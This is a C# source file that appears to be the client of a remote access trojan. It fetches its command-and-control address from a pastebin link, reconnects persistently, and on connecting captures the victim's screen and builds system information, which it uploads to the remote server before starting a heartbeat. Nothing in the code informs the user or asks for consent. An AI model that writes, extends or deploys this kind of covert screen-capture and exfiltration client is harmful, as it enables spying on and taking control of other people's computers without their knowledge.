using LazyServer;
using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

public static class ClientManager
{
    private static LazyServerClient _client;
    public static Action ClientDisconnected;

    public static async Task StartAsync()
    {
        _client = await CreateAndConnectClientAsync();

        // Attach event handler once here, for current client
        AttachEvents(_client);
    }

    private static void AttachEvents(LazyServerClient client)
    {
        client.Disconnected += async (_, __) =>
        {
            Console.WriteLine("Disconnected, trying to reconnect...");

            // IMPORTANT: create new client, connect, attach events, and update reference
            _client = await CreateAndConnectClientAsync();

            //AttachEvents(_client);
        };
    }

    private static async Task<LazyServerClient> CreateAndConnectClientAsync()
    {
        var server = (string)GClass.config()["server"];
        var port = (int)GClass.config()["port"];

        if ((bool)GClass.config()["pastebin"])
        {
            try
            {
                Console.WriteLine("Fetching server info from pastebin...");
                string pastebinres = await new HttpClient().GetStringAsync((string)GClass.config()["pastebinlink"]);
                if (!string.IsNullOrEmpty(pastebinres))
                {
                    var parts = pastebinres.Split(':');
                    server = parts[0];
                    port = int.Parse(parts[1]);
                }
                Console.WriteLine($"Using server: {server}, port: {port}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Pastebin fetch failed: " + ex.Message);
            }
        }

        while (true)
        {
            var client = new LazyServerClient();

            try
            {
                using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10))) // 10s timeout
                {
                    Console.WriteLine($"Trying to connect to {server}:{port} with timeout...");
                    var connectTask = client.ConnectAsync(server, port);
                    await Task.WhenAny(connectTask, Task.Delay(Timeout.Infinite, cts.Token));
                    cts.Token.ThrowIfCancellationRequested();
                }
                Console.WriteLine("Connected!");
                ClientDisconnected?.Invoke();

                var screenshot = GClass.CaptureScreen(Screen.PrimaryScreen, 50);
                var info = await GClass.BuildClientInfo();
                await client.SendFileBytesWithMeta(screenshot, info.ToString());

                GClass.StartHeartbeat(client);

                return client;
            }
            catch (OperationCanceledException)
            {
                Console.WriteLine("Connection attempt timed out, retrying...");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Connection failed: " + ex.Message);
            }

            await Task.Delay(2000); // backoff delay before retrying
        }
    }

    public static LazyServerClient GetClient() => _client;
}
